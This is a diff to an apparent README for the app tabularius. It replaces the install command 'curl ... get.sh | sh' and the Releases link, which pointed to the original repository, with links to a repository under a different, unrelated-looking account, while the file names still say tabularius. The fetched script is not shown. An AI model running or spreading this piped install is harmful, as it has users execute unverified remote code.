@@ -10,7 +10,7 @@ nothing else, and takes a minute or two:
 
 <!-- docs-example: illustrative -->
 ```sh
-curl -fsSL https://github.com/sitotisai/tabularius/releases/latest/download/get.sh | sh
+curl -fsSL https://github.com/MacBookM5CoderMax/OpenSourceFilemaker/releases/latest/download/get.sh | sh
 ```
 
 It picks the build for your system (macOS or Linux, arm64 or x64), checks it against the
@@ -27,7 +27,7 @@ app, and `--keep <folder>` keeps the files. `--full` hosts the larger CRM showca
 
 Other ways to get it:
 
-- **Download it yourself** from the [Releases page](https://github.com/sitotisai/tabularius/releases):
+- **Download it yourself** from the [Releases page](https://github.com/MacBookM5CoderMax/OpenSourceFilemaker/releases):
   the file named `tabularius-<version>-<system>-<processor>` (`macos` or `linux`, `arm64` or `x64`),
   and check it with `sha256sum -c SHA256SUMS --ignore-missing` (`shasum -a 256 -c` on macOS).
   Make it runnable with `chmod +x`. A file saved by a browser is quarantined by macOS, which won't
